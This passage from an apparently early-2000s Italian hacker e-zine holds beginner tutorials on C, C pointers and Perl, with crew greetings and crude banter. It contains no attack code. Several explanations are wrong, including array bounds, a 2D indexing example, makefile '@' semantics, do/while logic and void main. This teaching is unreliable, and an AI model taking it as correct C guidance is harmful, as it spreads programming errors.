  ulisses_1, hackerzine.org, digitalsin.org, computertemple.com)
- quelli che comprano win, in particolare gli admin di nt (neanderthal technology),
  (infatti tutte le versioni di win le trovate in siti warez :P)
- quelli che si sono iscritti alla mia newsletter solo per accedere alla
  sezione porno del sito (e sono parecchiotti: almeno 20 al giorno :o),
- rutelli (uno piu' imbecille non lo avevate? :-),
- ovviamente a quelli che mi querano quando sono pex3-away (anche se mi vedete parlare
  in chan sono impegnato, altrimenti mi chiamerei semplicemente pex3 ;-),
- gli insistenti, ricordate: domandare e' legittimo, rispondere e' cortesia. E
  spesso qualcuno non risponde perche': a)non ne ha volgia b)non lo sa c)ha di
  meglio da fare. Quasi mai non si risponde perche' si e' ciechi e/o stupidi
  e/o sordi, quindi evitare dei "domande-flood" (?) in chan e/o in query è la prima
  regolare per non ritrovarsi +b ;-)
greet a:
- noflyzone crew members ([]LoRd[V]icio[], Crashes, [D]kl, CityHunter, goony,
  Quasar, [Evil], R|Ppy, BIGAlex, Capitanmidnight, Pregzt, [V]lad, anetrip,
  Ov3rSyS, sevvv) tanaton, zerocky, DaveWork, ava666, lo0ker, Cujo, SuperAlbert,
  bitflesh, cavallocaruso, ErMaK, CobWebX, Lottan, RESINARO, GREEN_BERET, Cioda,
  IceAgitter^One e tutti quelli di cui mi sono scordato.

aspettando i vostri feed-back vi saluto.
          pex3@fuckwindows.com


------------------------------------*END*--------------------------------------

------------------------------------[20]---------------------------------------
----------------------------------[Quasar]-------------------------------------
-----------------------------------[C #1]--------------------------------------

-------------------------------
Shift_Red -> Universe expansion
-------------------------------

__NOFLYZONE CREW__

                           __________________________________

                           http://www.noflyzone-crew.cjb.net/
                           __________________________________


                            ____
                           / ___|
                          | |
                          | |___
                           \____|  Linguaggio di Programmazione


                         Tutorial forgiato da QUASAR Gennaio 2002



--------------------------------------------------------------------------------

   Guida di base per capire i primi comandi del C e imparare a compilare il
proprio
   codice nella vostra linux box.
   Il linguaggio C è il fondamento dei sistemi UNIX. Un minimo di conoscenza di
   questo linguaggio è importante per sapersi districare tra i programmi
distribuiti
   in forma sorgente.


--------------------------------------------------------------------------------

   SEZIONI_

   [1] Il compilatore GCC
   [2] Creare un semplice MAKEFILE
   [3] OUTPUT in C
   [4] Primitive e segni
   [5] Le variabili
   [6] INPUT in C
   [7] Cosa sono gli #include?
   [8] Array
   [9] Funzioni di controllo di flusso


--------------------------------------------------------------------------------

##############################################################################

--------------------------------------------------------------------------------

   [1] IL COMPILATORE GCC

   Per cominciare ad imparare il C è necessario che nella vostra linux box sia
   installato un compilatore, di default si tratta del GCC se nn lo avete
   installatelo solitamente si trova nella sezione develop di ogni distro.

   Il compilatore riceve in INPUT il codice sorgente e da in OUTPUT l'eseguibile
   per far cio' bisogna passare i seguenti parametri

    gcc <sorgente> -o <nome_eseguibile>

   Dove sorgente è il vostro codice (es.: asdsa.c) , l'eseguibile e il nome che
   darete all'eseguibile del vostro programma (es:: asada).
   Una volta compilato se nn risultano errori per eseguire il vostro lavoro
digitate

    ./<nome_eseguibile>

   Da notare che l'estensione del sorgente influisce sulla compilazione, a
grandi
   linee se date un sorgente "atry.c" verrà compilato in C se date "atry.C" il
   gcc compilera' in C++ (man gcc per maggiorni informazioni)

   Se la compilazione del vostro programma necessita di librerie aggiuntive
   bisognera' passare alcuni parametri aggiuntivi che comunicheranno al
compilatore
   la path delle librerire e il loro nome specifico

   es.:

   gcc prova.C -L /usr/local/lib -lglut -lGLU -lGL -o prova

   Queste sono le basi, in attesa di nuovi tutorial pre approffondire nel
frattempo
   leggetevi il manuale del gcc che sicuramente avrete :)

    man gcc


--------------------------------------------------------------------------------

   [2] CREARE UN SEMPLICE MAKEFILE


   Risulta scomodo, ogni qualvolta si vuole compilare il vostro programma, dover
   passare noiosi parametri al compilatore insomma si perdete tempo; molto piu'
   comode è creare un MAKEFILE in grado di automatizzare questo compito.

   Normalmente il sorgente e il MAKEFILE risiedono nella stessa cartella ecco
   un esempio di un makefile in grado di compilare il file "prova.c" dando in
   output un eseguibile "prova".

   #-------------------------------------------------------------
   # Makefile by Quasar
   #-------------------------------------------------------------

    SHELL = /bin/sh

    all:
	@echo;
	@echo [Compiling Wait...];
	@echo;
	@gcc prova.C -L /usr/local/lib -lglut -lGLU -lGL -o prova;
	@echo;
	@echo [Done];
	@echo || exit 1

    clean:
	@rm prova;
	@echo;
	@echo [Done];
	@echo || exit 1

    #------------------------------------------------------------

    Questi makefile vanno salvati senza estensione e con il nome "MAKEFILE" ;)
    Ora entrando nella directory dove si trovano il makefile e il vostro
sorgente
    dando il comando

     make all

    Verra compilato il vostro sorgente (NOTA: se digitate "make" e basta verra'
    eseguita la prima parte dello script "all")

     make clean

    Questo comando invece cancellera' l'eseguibile.
    Durante la compilazione apparira' il messaggio "[Compiling Wait...]" ma
questi
    sono solamente abbellimenti.
    In un makefile "#" serve a commentare il codice, "@echo" viene anteposto ai
    comandi da dare alla shell e anche a eventuali frasi da visualizzare, ";"
    chiudono la riga e "|| exit 1" viene messo alla fine di ogni comando (clean,
all)
    Per definire un nuovo comando si scrive "nome_comando:" e sotto il codice.
    "SHELL=/bin/sh" sta a significare il tipo di shell da utilizzare


--------------------------------------------------------------------------------

    [3] OUTPUT in C

    Per l'output in C viene usato principalmente il seguente comando:

    PRINTF

    Questo comando viene utilizzato per l'output su video.

    es.:

     printf(" NFZ FOREVER ");

    Questo comando dara' in output la scritta "NFZ FOREVER"
    Ora supponiamo di voler inserire anche dei numeri

    es.:

     printf(" NFZ FOREVER : %d ", 2004)

    L'output sara' :

     NFZ FOREVER 2004

    Dove %d sta a signficare che si vuole visualizzare un intero
    Printf riconosce una serie di codici di escape in grado per esempio di
mandare a
    capo il testo eccone riportati quelli standard

    __________________________________________________________

      Codice di Escape     Descrizione
    __________________________________________________________

            \ooo          Notazione ottale
            \xhh          Notazione esadecimale
            \\            Visualizza "\"
            \'            Visualizza un apice "'"
            \"            Visualizza un apice doppio
            \0            Codice <NUL>
            \a            Codice <BELL> (bip dello speaker)
            \b            Codice <BS>   (backspace)
            \f            Codice <FF>   (formfeed)
            \n            Codice <LN>   (linefeed)
            \r            Codice <CR>   (carriage return)
            \t            Tabulazione orizzontale
            \v            Tabulazione verticale

    __________________________________________________________




--------------------------------------------------------------------------------

    [4] Primitive e segni

    Ecco i segni principali e i loro significati

     Uso  : A x B dove x è uno dei segni sotto elencati

     =     Assegna un valore
     ==    Compara cioe' vero se si equivalgono
     >     Operatore MAGGIORE
     <     Operatore MINORE
     >=    Operatore MAGGIORE UGUALE
     <=    Operatore MINORE UGUALE
     !=    Operatore DIVERSO

     unsgigned int      Intero senza segno

     A++   Incrementa la var A di uno
     A--   Decrementa di uno
     --A   Decrementa A prima che venga restituito il valore
     ++A   Incrementa A prima che venga restituito il valore
     -A    Inverte il segno
     A*B   Moltiplica
     A/B   Divide
     A+=B  A=A+B
     A-=B  A=A-B
     A*=B  A=A*B
     A/=B  A=A/B
     A%=B  A=A%B



--------------------------------------------------------------------------------

    [5] Le variabili

    Come nella maggior parte dei linguaggi di programmazione anche il C ha le
    sue variabili.
    Una variabile è un'area di memoria dedicata all'allocamento di dati e verra'
    gestita in diversi modi a seconda che si tratti di caratteri numeri,
float..etc.

    es.:

     int pippo;

    Crea una variabile di nome pippo in grado di contenere numeri interi.

        ___________________________________________________________

          Variabile             Descrizione
        ___________________________________________________________

           char                 Contiene UN carattere
           short                intero
           int                  \
           long                 \
           float                intero con virgola
           double               
           long double          
        ___________________________________________________________

    Esistono poi le costanti, cioe' variabili di un qualsiasi tipo (int,char..)
    pero' dichiarate ed assegnate una sola volta es

     const int pippo=90;

    Non sara' piu' possibile riassegnare la variabile.


--------------------------------------------------------------------------------

    [6] INPUT in C

    Viene mostrata ora la tabella delle metavariabili utilizzabili nell'INPUT
    ma anche nell'OUTPUT


     ___________________________________________________________________________

      Simbolo           Corrispondenza
     ___________________________________________________________________________

       %c		Carattere singolo
       %s		Stringa
       %d		Intero con segno
       %u		Intero senza segno
       %o		Intero senza segno in ottale
       %x		Intero senza segno in hex
       %e		Numero a virgola mobile con notazione scientifica
       %f		Numero a virgola mobile in notazione decimale fissa
       %g               Numero a virgola mobile secondo la notazione di %e o %f


     Il comando di input è  SCANF

     es.:

     scanf("%d", &A);

     Chiede in input un valore decimale da inserire nella variabile A

     Altri esempi sono

     scanf("%s", &A);
     scanf("%c", &A);
     ...etc...



--------------------------------------------------------------------------------

     [7] Cosa sono gli #include?

     Ogni volta si comincia un programma si inseriscono gli include con gli
headers
     file che si intende utilizzare, ma a cosa servono?

     #include <nome.h>

     Ecco principalmente noi ora utilizziamo STDIO.H esso comprende le funzioni
     di I/O e comandi di base, volendo utilizzare altre funzioni di includeranno
     diversi tipi di include.


--------------------------------------------------------------------------------

     [8] Array

     Supponiamo di dover memorizzare nn un singolo carattere ma una stringa
     useremo questo comando

     char pippo[5];

     dove 5 sono i numeri di caratterei che puo' contenere da 0 a 5
     Supponiamo di avere in pippo la parola CIAO

       [0][1][2][3][4][5]
        C  I  A  O

     Ogni numero sopra corrisponde alla locazione dei singoli caratteri
     se volessimo visualizzare la I :

      pritnf("%c",pippo[1]);

     E cosi' per tutti gli altri

     Esistono array a 2 dimensioni e a 3 dimensioni ora spieghero' gli array
     a 2 dimensioni.

     char pippo[5][5];

     ecco il suo schema

       0 1 2 3 4 5

       1

       2

       3

       4

       5

     Supponiamo che sia caricato nel seguente modo

       0 1 2 3 4 5

       1 C I A O

       2

       3 P I P P O

       4

       5

      Se volessimo visualizzare la I di Ciao :

      printf("%c",pippo[1][2]);

      Si puo' pensare quindi ad una matrice con righe e colonne
      il primo valore sara' la righa il secondo la colonna [x][y]


--------------------------------------------------------------------------------

     [9] Funzioni di controllo di flusso

     Ecco le 3 funzioni fondamentali del C

     ____ if/else:

       Decide se un'operazione è vera o no :

        if(A<B) printf("ciao")
          else printf("error")

       Se A<B allora scrivi CIAO altrimenti scrivi ERROR, al posto di A<B si
       puo' usare un qualsiasi operatore

     ____ do/while:

       Inizia un ciclo e ne esce fintantoche' la condizione nn è vera

        int i=0;

        do{
           printf("CIAO");
           i++;
          }while(i<5);

       Scrive  CIAO fintantoche' i è minore di 5 e ogni volta lo incrementa

     ____ for():


       Inizia un ciclo e ne esce solo se una condizione è vera:

       for(funz1,funz2,funz3)

       es.:

       for(int i=0;i<5;i++)
       {
        printf("CIAO");
       }

       In pratica pone i a zero una volta sola poi controlla ogni volta
       se i < 5 se è minore incrementa i scrive ciao e continua altrimenti
       esce

       NOTA:

       Se si pone for(;;){} andra' in loop infinito ;)


--------------------------------------------------------------------------------

      END END END END END END END END END END END END END END END END END END
END END


--------------------------------------------------------------------------------

       Questa vuole essere una guida completamente di base niente di piu'
       futuri aggiornamenti arriveranno presto.

------------------------------------*END*--------------------------------------

------------------------------------[21]---------------------------------------
----------------------------------[Quasar]-------------------------------------
-----------------------------------[C #2]--------------------------------------


  __NOFLYZONE CREW__

                           __________________________________

                           http://www.noflyzone-crew.cjb.net/
                           __________________________________


                            ____
                           / ___|
                          | |
                          | |___
                           \____|  Linguaggio di Programmazione
       
                    
                         Tutorial forgiato da QUASAR Marzo 2002

                              
                                         PARTE #2

 ________________________________________________________________________________________

 .'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'
 ________________________________________________________________________________________


       Ecco la seconda e probabilmente ultima 
       parte di questo tutorial per 
       introdurre il C in ambito UNIX.

  
           
                                 ..:::: S E Z I O N I ::::..

    [1] Piu' sorgenti un eseguibile 
    [2] Array a 2Dimensioni
    [3] Le Funzioni() 
    [4] Include
    [5] Tempo :)
    [6] Puntatori [per chi gia' li conosce]
           
 ________________________________________________________________________________________

 .'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'
 ________________________________________________________________________________________


 [1] Piu' sorgenti un eseguibile 
 
  Per organizzare meglio il proprio lavoro molte volte conviene dividere in piu' sorgenti
  il proprio programma successivamente compilare con 'cc' i sorgenti in modo separato
  ed unirli in un unico eseguibile
  
  es.:

  /* P_pippo1.c */

  #include<stdio.h>
  #include<conio.h>	/* non serve ma e' per fare un esempio */

  void procedura();

  main()
   {
    procedura();
   }

  
  /* P_pippo2.c */ 

  #include<stdio.h> 
  #include<conio.h>      
  
  void procedura()
  {
   printf("PIPPO!");
  }

  Ora compiliamo i sorgenti

  cc -c P_pippo1.c
  cc -c P_pippo2.c

  Ora creiamo il sorgente

  cc -o PippoEXE P_pippo1.o P_pippo2.o

  ed ora eseguiamo il nostro programma :)

  ./PippoEXE

  
 ----------------------------------------------------------------------------------------   
 
 [2] Array a 2Dimensioni
 
  Un array puo' avere fino a 3 dimensioni, per farvi un'idea di come funziona piu'
  precisamente impareremo ora a creare un array bidimensionale riempirlo e visualizzarne
  il contenuto

  int array[10][10];

  Abbiamo appena creato un array 10x10 contenente valori interi (INT);
  Noi lo pensiamo come una griglia righe x colonne ma al nostro calcolatore nn fa dif-
  ferenza che sia a una o due dimensioni in ogni caso lo interpreta cosi' :

   Array 1D

   +----+----+----+----+----+--------
   |    |    |    |    |    |            
   |    |    |    |    |    |            
   +----+----+----+----+----+--------  etc . . .

   Array 2D
     
    C1R1 C2R1 C3R1 C4R1 C5R1 C1R2 C2R2    (Riga Colonna)
   +----+----+----+----+----|--------------
   |    |    |    |    |    |    |    |               
   |    |    |    |    |    |    |    |                
   +----+----+----+----+----|--------------  etc . . .

  Riempiano ora un array 2D . . . 

  /*   Array2D.c                */
  /*                            */
  /*   Fill Array , View Array  */

  #include<stdio.h>

  const int righe = 5;         // devono essere const NOTARE
  const int colonne = 5;

  int array[righe][colonne];   // crea l'array delle dimensioni vuolute
  int valore;

  void main()
  {
   for(int r=0; r<righe; r++)        // grazie a questo ciclo annidato ogni volta     
   {                                 // che si finiscono le colonne il ciclo interno
    for(int c=0; c<colonne; c++)     // esce e si incrementa di uno il ciclo esterno
    {                                // spostandosi quindi di una riga verso il basso
     scanf("%d", &valore);         // preleva il valore da inserire  
     array[r][c] = valore;         // inserisce il valore      
    }
   }   

   for(int r=0; r<righe; r++)
   {
    for(int c=0; c<colonne; c++)
    {
     printf("%d", array[r][c]);       // visualizza i valori       
    }
   }
  }

 ----------------------------------------------------------------------------------------   
 
 [3] Le Funzioni() 

  Non si puo' creare un programma interamente all'interno del proprio MAIN bisogna
  scomporlo in diversi moduli cioe' funzioni
  Pensiamo di avere 3+4 possiamo creare una funzione che presi due numeri ne
  ritorna la somma cosi' ogni volta che dovremo rifare un calcolo simile chiamaremo
  la nostra funzione :)

  funzioni con ritorno valori RETURN :

  Si crea una funzione di tipo int float char a seconda di quale valore dovra' ritornare
 
  es.:
  
  /* Funzione.c */

  #include<stdio.h>

  int Somma(int v1, int v2);// prototipo
 
  void main()
  {
   int a;
   int b;
   int ris;

   scanf("%d", &a);        // inserisce il valore a
   scanf("%d", &b);
   
   ris = Somma(a,b);       // chiama la funzione assegnando a ris la funzione stessa
                           // ma con i due valori che intendiamo passargli
   printf("%d", ris);
  }                        

  int Somma(int v1, int v2)
  {
   int risultato;
   risultato = v1+v2;

   return risultato;       // ritorna il risultato
  }

  notare che la funzione ritorna un INT quindi è dichiarata con un INT, da notare
  la chiamata della funzione che si effettua assegnandola al valore che vogliamo
  sia ritornato.
  Infine sulla funzione notiamo il return con il valore che vogliamo tornare.
 
  Questo programma fa inserire 2 numeri poi passa i valori alla funzione e infine
  ritorna il "risultato" della funzione
  

 funzioni VOID :

  es .:

  
#include <stdio.h>

void  somma(int a, int b);

int main()
{
  int val1;
  int val2;

  printf("val1 >  ");
  scanf("%d", &val1);
  printf("val2 >  ");
  scanf("%d", &val2);

  somma(val1, val2);

  return 0;
}

void  somma(int a, int b)
{
  int ris = a + b;
  printf("%d", ris);
}
 


  Notare che la chiamata della funzione si effettua scrivendo semplicemente la funzione
  senza void e passando i parametri appena dichiarati (val1...)


 
 ----------------------------------------------------------------------------------------   
  
  [4] Include

    <pippo.h>

    "pippo.h"

   Nella prima sintassi si intende un include file nella directory del proprio compilatore
   nella seconda invece si intende un include file nella directory locale o eventualmente
   specificando il path una qualsiasi altra directory


 ----------------------------------------------------------------------------------------  

  [5] Tempo :)

   Includo ora un mio programma per visualizzare il tempo in C, puo' servire come esempio
   di programma in  C ma sopratutto per insegnarvi facilmente ad usare la time.h come
   cronometro.
   NOTARE : certi commenti sono presi direttamente dalla man page della time.h
   

* Cronometro.c -> By Quasar */

#include <time.h>
#include <stdio.h>

int main(void)
{
 int dec=0;   // decimi di secondo

 for(;;)
 {
  
  /*
     -----------------------------------------------------------------------------  
     
     *punt è un puntatore alla struttura tm definita nel file /usr/include/time.h 
      e riportata in parte qua sotto:
     
  struct tm
  {
    int tm_sec;		//Seconds.	[0-60] (1 leap second) 
    int tm_min;	    // Minutes.	[0-59] 
    int tm_hour;   	// Hours.	[0-23] 
    int tm_mday;	   // Day.		[1-31] 
    int tm_mon;		// Month.	[0-11] 
    int tm_year;	   // Year	- 1900. 
    int tm_wday;	   // Day of week.	[0-6] 
    int tm_yday;	   // Days in year.[0-365]
    int tm_isdst;	  // DST.		[-1/0/1]
  
  # ifdef	__USE_BS
    long int tm_gmtoff;		// Seconds east of UTC. 
    __const char *tm_zone;	 Timezone abbreviation.  
  # else
    long int __tm_gmtoff;		 Seconds east of UTC.  
    __const char *__tm_zone;	 Timezone abbreviation. 
  # endif
  };

  ---------------------------------------------------------------------------------

  */     
  
  struct tm *punt;    // vedi sopra ^
  time_t user_time;   // obj a time
  user_time=time('\0');
  punt=localtime(&user_time); // localtime è la funzione inclusa in time.h
  dec++;
  printf("\n%d",punt->tm_hour);
  printf(":%d",punt->tm_min);
  printf(":%d",punt->tm_sec);
  printf(":%d",dec); 	
 }
} 

  Per compilarlo
   
   gcc nomefilesorgente.c -o nomeeseguibile


 ----------------------------------------------------------------------------------------  

  [6] Puntatori [per chi gia' li conosce]

   Per dichiarare in C un puntatore :

    int *puntatore;

   Per allocare la memoria di un puntatore :

    void *malloc (size_t dimensione_punt);  // carica un'area di una dimensione prefissata 
                                             
    void *calloc (size_t numero_elementi, size_t dimensione_punt)  // server per allocare array
                                                                   // infatti oltre alla dimensione
                                                                   // indichiamo il numero di 
                                                                   // locazioni
     
    Per deallocare il puntatore dalla memoria :

    void free (void* puntatore); 

 ----------------------------------------------------------------------------------------  

 Byez_ 

 1010101001010000001010100101010101010010101 System Fault_ 000000000000000000000000000000 

 ---------------------------------------------------------------------------------------- 



------------------------------------*END*--------------------------------------


------------------------------------[22]---------------------------------------
--------------------------------[CityHunter]-----------------------------------
------------------------------[Puntatori in C]---------------------------------


Hola! Prima di continuare sul discorso spoofing ho deciso di fare una piccolis-
sima digressione su uno degli argomenti più ostici che si hanno quando si impara
il linguaggio C: i puntatori.

----[Cosa sono i puntatori]----

I puntatori sono variabili che contengono l'indirizzo di un'altra variabile.
Facciamo un piccolo esempio preso dalla bibbia del C (Kernighan,Ritchie):

"Una macchina possiede un vettore di celle di memoria numerate o indirizzate
in modo consecutivo; queste celle possono essere manipolate singolarmente o a
gruppi[...]. Un puntatore è un gruppo di celle che può contenere un indirizzo.
Quindi, se C è un char e p un puntatore che punta a C, possiamo rappresentare
la situazione con il seguente schema:

                ----------------------\
               /                       \
            p:/                         \ c:
---------------------------------------------------------
	|celle	|	|........|	|	|
	|di     |	|........|	|	|
	|mem.	|	|........|	|	|
---------------------------------------------------------

L'operatore unario & fornisce l'indirizzo di un oggetto, perciò l'istruzione

	p=&C;

assegna l'indirizzo di C alla variabile p, e si dice he p punta a C."

Ok, qui si conclude la parte rippata;-)

Le variabili di tipo puntatore permettono di accedere alla memoria in modo
indiretto:

    memoria
   principale
+---------------+
|		|		int a;
|  		|		....
|  +-----+	|		a=10;
|  |  a  |   	|
|  +-----+	|
|		|
+---------------+


    memoria
   principale
+---------------+
|		|
|  		|     		int a; int *p;
|  +-----+	|		....
|  |  a  |\   	|		p=&a;
|  +-----+ |	|		*p=10;
|	   |	|
|  +-----+ |	|
|  |  p  |/	|
|  +-----+ 	|
+---------------+

(Non avete idea di quanto sia stata dura fare questi disegnini!!!)

L'operatore & permette di risalire dal nome di una variabile al suo puntatore:

	p = &a;

L'operatore * permette di accedere alla cella di memoria referenziata
da una variabile puntatore:

	*p = 10;


----[Operazioni sui puntatori]----

Qui metto sei semplici esempi di operazioni sui puntatori.
Procediamo con l'assegnazione:

p = q;	/* p è il puntatore definito all'inizio del tut */

es:	p = p+6; 	/* come definito sopra, p punta ad un intero */
			/* in questo caso p, dopo l'istruzione, punta */
			/* all'intero posto 6 interi dopo in memoria */
	p = p-3;
	p++;		/* esempi come sopra */


----[Uso dei puntatori]----

Qui vediamo come usare i puntatori applicati ad un vettore.
Immaginiamo di voler scannare e azzerare un vettore:

...
int vett[N];
int *p;
...
p = &vett[0];
for (i=0;i<N;i++)
	*p++ =0;
...

Definiamo un vettore di N elementi e il solito puntatore p.
Puntiamo all'elemento 0 del vettore con p=&vett[N]. Col ciclo for azzeriamo
tutti gli N valori con *p++=0.


----[Puntatori e strutture]----

Se p è un puntatore a una struttura, possiamo applicargli l'operatore ->

es: p->nome_campo = (*p).nome_campo

Facciamo un esempio più lungo e più chiaro:

struct scheda{
	int codice;
	char nome[20];
	char cognome[20];
	};
struct scheda *p;
struct scheda vett[N];
...
p=vett;
for (i=0;i<N;i++)
	{
	p -> codice=0;
	p++;
	}

Qui cosa facciamo? Definiamo la struttura scheda con vari campi, tra cui
codice. Associamo un puntatore alla struttura "struct scheda *p".
Creiamo un vettore di strutture "struct scheda vett[N]".
Facciamo partire il puntatore p dall'elemento 0 del vettore con "p=vett".
Con il solito ciclo for azzeriamo tutti i campi codice del vettore di
strutture "p->codice=0".
Mi sembra abbastanza chiaro,no?:) Credo che questa piccola ma efficace
spiegazione semplifichi parecchio la comprensione dei vari codici che fanno
uso di raw socket!


----[Puntatori e vettori]----

In C il nome di una variabile di tipo vettore coincide con il puntatore
al primo elemento del vettore. Puntatori e nomi di vettori sono quindi
intercambiabili. Vediamo qualche esempio:

/* Definizioni */
int vett[MAX];
int *p;
/* Inizializzazioni */
p = vett;		=		p=&vett[0];
/* Forme equivalenti */
vett[0]=10;		=		*p=10;
vett[10]=25;		=		*(p+10)=25;
vett[i]=0;		=		*(p+i)=0;
*vett=30;		=		p[0]=30;


----[Conclusioni]----

Ecco finito il piccolo tutorial! L'avevo detto che era sintetico,no;-)?
Cmq credo di aver spiegato abbastanza chiaramente il concetto puntatori.
Ok,prometto che il prox articolo sarà sulle implementazioni dello spoofing
vedente,giuro!:-D

Tnx to: Zukky,Vicio,Crashes,Ike,Xp,Pit,Tanaton,Vlad,FuSyS,e tutti quelli della
	crew NoFlyZone!

Fck to: bah...non saprei, a chi sto sul culo che tanto non me ne frega un cazzo!

Special Tnx: il mio prof di algoritmi x le varie spiegazioni:-)

Byezzzz  <<<<<<<<<<<<HacK The PlAneT>>>>>>>>>>>>
REMEMBER: there's nothing right or wrong, there're only fun and boring!


------------------------------------*END*--------------------------------------

------------------------------------[23]---------------------------------------
------------------------------[[]Lord[V]icio[]]--------------------------------
---------------------------------[Perl #2]-------------------------------------



Come vi avevo promesso,eccoci di nuovo qua x continuare il nostro
studio al PERL.Spero abbiato studiato x bene il primo tutorial ed
esercitati sulle variabili.....
In questa seconda parte chiariremo alcuni concetti e introdurremo
di nuovi..azionate il cercevello e via ! :)


                          INIZIAMO
.................................................................

                          STRIGHE

IN perl viene definita striga un valore composto da una sequenza di
caratteri..x caratteri intendiamo tutto l'insieme ASCII + i vari
costrutti escape ( \n \r ecc )

Il perl distingue solo 2 tipi di strige quelle con interpolazione
delle variabili e interpretazione dei costrutti escape e quelle senza
interpolazione ed interpretazione.
Si intende x interpolazione e quindi interpretazione quelle strighe
delimitate dagli " " viceversa quelle con un solo apice (') nn sono
ne interpolate ne interpretate.

IN PRATICA
Aprite il vostro edit di testi ...

$a = ' NoFlyZone Crew ';
print "La miglior creW $a \n";

Vi darà :

La miglior creW  NoFlyZone Crew
c:\>

Avete notato il ritorno a capo grazie all'interpretazione dell'escape \n

Proviamo con il singolo apice

$a = ' NoFlyZone Crew ';
print 'La miglior creW $a \n';

Vi darà :

La miglior creW $a \n
c:\>

Come avete notato nn c'è stata nessuna interpretazione del contenuto
del comando print.....

Ci sono alcuni casi in cui l'uso dei doppi apici o singoli nn fa differenza
lo vedremo tra poco ........

..................................................................

Le strighe possiamo farle interragire fra di loro,un esempio potrebbere
essere quello dellla ripetizione .......

$a = "lordvicio " x 3;
print "$a";

il risultato sarà : lordvicio ripetuto 3 volte

$a = "lordvicio " x 3;
print '$a';

Anke con i singoli apici il risultato sarà lo stesso ...

.........potrete provare innumerevoli combinazioni..........


$a = "1" x (3*4); ----------> il risultato sarà 1 ripetuto 12 volte

$b = (10-5) x 3;  ----------> il risultato sarà 5 ripetuto 3  volte

Esercitatevi provando + combinazioni,è tutto molto semplice :)

..................................................................
..................................................................

                             NUMERI

Nel Perl i numeri sono rappresentati per mezzo di simboli,di facile
interpretazione,chiamati anke in generale "letterati".
L'uso dei numeri in perl è molto semplice in quanto l'interprete Perl
tratta tutti i valori numerici allo stesso modo utilizzando la doppia precisione.
Il perl supporta tutte le operazioni più comuni:somma sottrazione, moltiplicazione,
divisione, resto della divisione, potenze.......

IN PRATICA


$numero1 = 4;
$numero2 = 3;
$a = $numero1 + $numero2;
print "$a";

il risultato sarà 7

$numero1 = 4;
$numero2 = 3;
$a = $numero1 * $numero2;
print "$a";

il risultato sarà 12

$numero1 = 4;
$numero2 = 3;
$a = $numero1 / $numero2;
print "$a";

il risultato sarà 1.333333

$numero1 = 4;
$numero2 = 3;
$a = $numero1 - $numero2;
print "$a";

il risultato sarà 1

$numero1 = 4;
$numero2 = 3;
$a = $numero1 ** 2;
print "$a";

il 4 verrà elevato alla seconda,il risultato sarà 16

lascio a voi tutte le altre prove,divertitevi :)

------------------------------------------------------------------
                            UNDEF

Il perl oltre ai valori numerici e strighe riconosce un altro valore
definito : undef ... questo valore viene interpreatato 0 come variabile
numerica e nulla come striga

IN PRATICA

$a = 1 * undef;
print " $a \n";

il risultato sarà 0

$a = 1 + undef;
print " $a \n";

il risultato sarà 1

print "-------\n";
$b = "tempo:";
print "$b undef\n";

il risultato sarà tempo: undef

Nn sono molto fantasioso ad esempi,fate voi ;)

-------------------------------------------------------------------

Finalmente siamo giunti a quello che ardentemente speravate ;)

INTERAZIONE CON IL PROGRAMMA

Finalmente passiamo a fare qualcosa di dinamico...facciamo interagire
l'user creando un piccolo script grazie all'uso di un operatore speciale
detto parentesi angolari ......

IN PRATICA

print "Come ti chiami ?\n";
$nome = <STDIN>;
print "Quanti anni hai ?\n";
$eta = <STDIN>;
print "6 stupido ?\n";
$stupido = <STDIN>;
print "meglio ^_^ \n";
chomp ($nome);
chomp ($eta);
chomp ($stupido);
print "Il tuo nome è $nome e hai $eta anni";

Potete divertirti a creare tutti gli script ke volete .....

-------------------------------------------------------------------

Come avete notato nn ho trattato operazioni tra Numeri e Stringhe
però vi ho fornito tutto l'occorrente x potere smanettare da soli :)
Nn vi rischiate ad andare a sbirciare altre guide dovete solo perdere
tempo ed avere passione e riuscirete a fare grandi cose .......
Vi ho mostrato le basi del perl , l'ho cercato di fare nel + semplice dei
modi,spero di essere stato chiaro e specialmente utile :)
Il prossimo appuntatamento con questa guida al perl spero nn sarà troppo
lontano .. conto di srivere ancora qualkosa mostrandovi,diversi sorgenti
sempre ben spiegati x insegnarvi a fare script + funzionali completi
ed utili........ora vi saluto ..... ByeZZZzz




Un salutone alla splendida NoFlyZone Crew che sta svolgendo un ottimo lavoro
in particolare a : Crashes (6 troppo tajo ;) , CityHunter (il filosofo della
crew ;) ed a tutti gli altri membri ...........
www.noflyzone-crew.cjb.net

X qualsiasi chiarimento basta mandarmi un e-mail o venirmi a trovare in irc
irc.azzurra.org #NoFlyZone ---- > my nick : []LoRd[V]icio[]



               _________________________________________
              [                                         ]
              [            Copyright (C) 2001           ]
              [                                         ]
              [ []LoRd[V]icio[]  -lordvicio@hotmail.com ]
              [________________________________________ ]



------------------------------------*END*--------------------------------------

------------------------------------[24]---------------------------------------
----------------------------------[Quasar]-------------------------------------
-----------------------------[Puntatori in C++]--------------------------------



  __NOFLYZONE CREW__

                           __________________________________

                           http://www.noflyzone-crew.cjb.net/
                           __________________________________

                       TUTORIAL FORGIATO DA QUASAR NEL MARZO 2002



                                    PUTANTORI IN C++



  _______________________________________________________________________________________

  '.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'
  _______________________________________________________________________________________


  Premessa :

  Questa guida richiede conoscenze medie del C++.
  I puntatori sono essenziali nel C++ , vediamo in cosa consistono :)




                               ..::: INDICE TUTORIAL :::..

  1] Puntatori?
  2] Operatori Fondamentali
  3] Altri Operatori
  4] Puntatori & Array
  5] Programma di esempio

  _______________________________________________________________________________________

  '.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'
  _______________________________________________________________________________________

    _
   / |
   | |
   | |_
   |_(_)PUNTATORI?


  Un puntatore è una variabile che contiene un indirizzo di memoria e questo inidirizzo
  molto spesso è la locazione di un'altra variabile.
  Per esempio se x contiene l'indirizzo di y allora si dice che "x punta a y" (x->y)
  Impariamo ora a dichiarare un puntatore, la sintassi e la seguente

  es .:

           int *puntatore;

  in generale :

           tipo *puntatore;

